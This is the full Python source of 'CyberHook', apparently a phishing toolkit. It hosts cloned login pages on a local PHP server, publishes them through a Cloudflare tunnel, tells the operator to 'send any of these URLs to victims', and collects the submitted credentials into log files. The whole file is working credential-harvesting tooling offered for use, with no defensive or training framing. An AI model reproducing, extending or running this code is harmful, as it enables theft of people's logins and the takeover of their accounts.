import os
import sys
import subprocess
import shutil
import time
import platform
import re
from threading import Thread
import requests
from colorama import Fore, Style, init
from datetime import datetime
import shutil


# Initialize colorama
init(autoreset=True)

# Constants
VERSION = "1.0"
BASE_DIR = os.path.dirname(os.path.realpath(__file__))
SERVER_DIR = os.path.join(BASE_DIR, ".server")
AUTH_DIR = os.path.join(BASE_DIR, "auth")
HOST = "127.0.0.1"
PORT = 8080
CLOUDFLARED_URLS = {
    "linux-arm": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm",
    "linux-amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
}

class CyberHook:
    def __init__(self):
        self.cloudflared = None
        self.php_process = None
        self.tunnel_url = None
        self.setup_directories()

    def setup_directories(self):
        """Create necessary directories with proper permissions."""
        os.makedirs(SERVER_DIR, exist_ok=True)
        os.makedirs(AUTH_DIR, exist_ok=True)
        os.makedirs(os.path.join(SERVER_DIR, "www"), exist_ok=True)
        os.chmod(AUTH_DIR, 0o755)

    def color_print(self, color, message):
        """Print colored messages."""
        print(f"{color}{message}{Style.RESET_ALL}")

    def check_dependencies(self):
        """Check if required tools are installed."""
        dependencies = ["php", "curl", "unzip"]
        missing = []
        for dep in dependencies:
            if not shutil.which(dep):
                missing.append(dep)
        if missing:
            self.color_print(Fore.RED, f"Missing dependencies: {', '.join(missing)}")
            sys.exit(1)

    def get_phishing_sites(self):
        """Get list of available phishing sites from .sites directory"""
        sites_dir = os.path.join(BASE_DIR, ".sites")
        if not os.path.exists(sites_dir):
            return []
        
        sites = []
        for item in os.listdir(sites_dir):
            if os.path.isdir(os.path.join(sites_dir, item)):
                sites.append(item)
        return sorted(sites)

    def start_php_server(self):
        """Start a PHP server."""
        os.chdir(os.path.join(SERVER_DIR, "www"))
        self.php_process = subprocess.Popen(
            ["php", "-S", f"{HOST}:{PORT}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.color_print(Fore.GREEN, f"[+] PHP server started on {HOST}:{PORT}")

    def start_cloudflared(self):
        """Start Cloudflared tunnel."""
        cloudflared_path = os.path.join(SERVER_DIR, "cloudflared")
        if not os.path.exists(cloudflared_path):
            self.download_cloudflared()
        
        self.cloudflared = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", f"http://{HOST}:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(8)
        self.tunnel_url = self.extract_tunnel_url()
        if self.tunnel_url:
            self.color_print(Fore.GREEN, f"[+] Cloudflared tunnel created: {self.tunnel_url}")
        else:
            self.color_print(Fore.RED, "[!] Failed to get Cloudflared URL")

    def download_cloudflared(self):
        """Download Cloudflared binary."""
        arch = platform.machine()
        if "arm" in arch or "aarch64" in arch:
            url = CLOUDFLARED_URLS["linux-arm"]
        else:
            url = CLOUDFLARED_URLS["linux-amd64"]
        
        self.color_print(Fore.CYAN, "[*] Downloading Cloudflared...")
        response = requests.get(url, stream=True)
        with open(os.path.join(SERVER_DIR, "cloudflared"), "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        os.chmod(os.path.join(SERVER_DIR, "cloudflared"), 0o755)

    def extract_tunnel_url(self):
        """Extract the Cloudflared tunnel URL with improved regex."""
        pattern = re.compile(r'https://[\w-]+\.trycloudflare\.com')
        start_time = time.time()
        timeout = 25
        
        while time.time() - start_time < timeout:
            line = self.cloudflared.stderr.readline()
            if line:
                match = pattern.search(line)
                if match:
                    return match.group()
            time.sleep(0.2)
        return None

    def copy_site_files(self, site_name):
        """Copy phishing site files to the server directory.""" 
        src = os.path.join(BASE_DIR, ".sites", site_name)
        dest = os.path.join(SERVER_DIR, "www")
        if os.path.exists(dest):
            shutil.rmtree(dest)
        shutil.copytree(src, dest)

    def start_phishing(self, site_name):
        """Start the phishing attack with URL display."""
        self.target_site = site_name
        self.copy_site_files(site_name)
        self.start_php_server()
        self.start_cloudflared()
        self.show_phishing_url()
        self.monitor_logs()

    def show_phishing_url(self):
        """Display phishing URLs with proper formatting."""
        local_ip = subprocess.getoutput("hostname -I").split()[0]
        urls = []
        
        if self.tunnel_url:
            urls.append(f"Cloudflared URL: {Fore.CYAN}{self.tunnel_url}")
        
        urls.append(f"Local URL: {Fore.YELLOW}http://{HOST}:{PORT}")
        urls.append(f"Network URL: {Fore.YELLOW}http://{local_ip}:{PORT}")

        self.color_print(Fore.GREEN, "\n[+] Phishing URLs:")
        for url in urls:
            print(f"  → {url}")
            
        print(f"\n{Fore.WHITE}Send any of these URLs to victims")

    def monitor_logs(self):
        """Monitor for captured credentials."""
        def check_credentials():
            cred_file = os.path.join(SERVER_DIR, "www", "usernames.txt")
            while True:
                try:
                    if os.path.exists(cred_file):
                        with open(cred_file, "r") as f:
                            new_creds = f.read().strip()
                        
                        if new_creds:
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            auth_file = os.path.join(AUTH_DIR, f"credentials_{timestamp}.txt")
                            
                            with open(auth_file, "w") as auth_f:
                                auth_f.write(new_creds)
                            
                            self.color_print(Fore.GREEN, "\n[+] New credentials captured:")
                            print(new_creds)
                            

                            with open(os.path.join(AUTH_DIR, "credentials.log"), "a") as log:
                                log.write(f"\n{'-'*50}\n{new_creds}\n")
                            
                            os.remove(cred_file)
                    time.sleep(0.5)
                except Exception as e:
                    print(f"Monitoring error: {str(e)}")
                    time.sleep(1)

        Thread(target=check_credentials, daemon=True).start()
        
        try:
            input(f"{Fore.CYAN}\n[+] Phishing active. Press Enter to stop...")
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()

    def cleanup(self):
        """Clean up resources."""
        self.color_print(Fore.RED, "\n[!] Cleaning up...")
        if self.php_process:
            self.php_process.terminate()
        if self.cloudflared:
            self.cloudflared.terminate()
        shutil.rmtree(os.path.join(SERVER_DIR, "www"))
        sys.exit(0)

def scale_ascii_block(art_lines, max_width):
    # Calculate original dimensions
    original_width = max(len(line.rstrip()) for line in art_lines)
    original_height = len(art_lines)
    
    # Calculate scale factor
    scale = min(max_width / original_width, 1.0)
    new_width = min(int(original_width * scale), max_width)
    
    # Create scaled art
    scaled_lines = []
    for line in art_lines:
        scaled_line = ""
        for i in range(new_width):
            orig_index = int(i / scale)
            if orig_index < len(line):
                scaled_line += line[orig_index]
            else:
                scaled_line += " "
        scaled_lines.append(scaled_line)
    
    return scaled_lines

def show_name_tag():
    init(autoreset=True)
    term_width, _ = shutil.get_terminal_size()
    
    original_art = rf"""


{Fore.GREEN}    /$$$$$$            /$$   /$$                     /$$      
{Fore.GREEN}   /$$__  $$          | $$  | $$                    | $$      
{Fore.GREEN}  | $$  \__/ /$$   /$$| $$  | $$  /$$$$$$   /$$$$$$ | $$   /$$
{Fore.GREEN}  | $$      | $$  | $$| $$$$$$$$ /$$__  $$ /$$__  $$| $$  /$$/
{Fore.GREEN}  | $$      | $$  | $$| $$__  $$| $$  \ $$| $$  \ $$| $$$$$$/ 
{Fore.GREEN}  | $$    $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_  $$ 
{Fore.GREEN}  |  $$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$
{Fore.GREEN}   \______/  \____  $$|__/  |__/ \______/  \______/ |__/  \__/
{Fore.GREEN}             /$$  | $$                                                                            
{Fore.GREEN}            |  $$$$$$/                                                                            
{Fore.GREEN}             \______/   


{Fore.YELLOW}CyberHook v1.0
{Fore.MAGENTA}Phishing Tool by Darshan Patel
{Fore.MAGENTA}GitHub: https://github.com/darshanpatel4
    """

    # Split into components
    art_lines = original_art.split('\n')[1:-4]
    text_lines = original_art.split('\n')[-4:]

    # Scale main art block
    scaled_art = scale_ascii_block(art_lines, term_width - 4)
    
    # Center and print
    print(f"\n{Fore.CYAN}" + "#" * term_width)
    for line in scaled_art:
        print(line)
    print(f"{Fore.CYAN}" + "#" * term_width)
    
    # Print text lines
    for line in text_lines:
        print(line)


def show_help():
    print(f"""
{Fore.CYAN}CyberHook Help:
{Fore.GREEN}• Select a number from the available sites
{Fore.GREEN}• Sites are loaded from the .sites directory
{Fore.GREEN}• After selection, share the generated URL
{Fore.GREEN}• Captured credentials save to auth/ directory
{Fore.YELLOW}• Press Enter in the phishing session to exit""")

def main():
    show_name_tag()
    cyberhook = CyberHook()
    cyberhook.check_dependencies()
    
    sites = cyberhook.get_phishing_sites()
    if not sites:
        cyberhook.color_print(Fore.RED, "[!] No phishing sites found in .sites directory!")
        sys.exit(1)

    # Display menu with proper spacing
    cyberhook.color_print(Fore.CYAN, "\nAvailable Phishing Sites:")
    cols = 3
    site_count = len(sites)
    per_col = (site_count + cols - 1) // cols
    col_width = 17  # Adjust column width for better alignment

    for i in range(per_col):
        row = []
        for col in range(cols):
            index = i + col * per_col
            if index < site_count:
                site_num = index + 1
                row.append(f"{Fore.GREEN}{site_num:02}{Fore.WHITE} → {sites[index]:<{col_width}}")
        if row:
            print("".join(row))

    # Add help and exit options
    print(f"\n{Fore.YELLOW} 0 → Help")
    print(f"{Fore.RED}99 → Exit")

    # Get user choice
    try:
        choice = int(input(f"\n{Fore.YELLOW}Enter choice (01-{site_count}): "))
    except ValueError:
        cyberhook.color_print(Fore.RED, "Invalid input!")
        sys.exit(1)

    if choice == 0:
        show_help()
        sys.exit(0)
    elif choice == 99:
        cyberhook.color_print(Fore.RED, "Exiting...")
        sys.exit(0)
    elif 1 <= choice <= len(sites):
        selected_site = sites[choice-1]
        cyberhook.start_phishing(selected_site)
    else:
        cyberhook.color_print(Fore.RED, "Invalid choice!")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Interrupted by user")
        sys.exit(0)
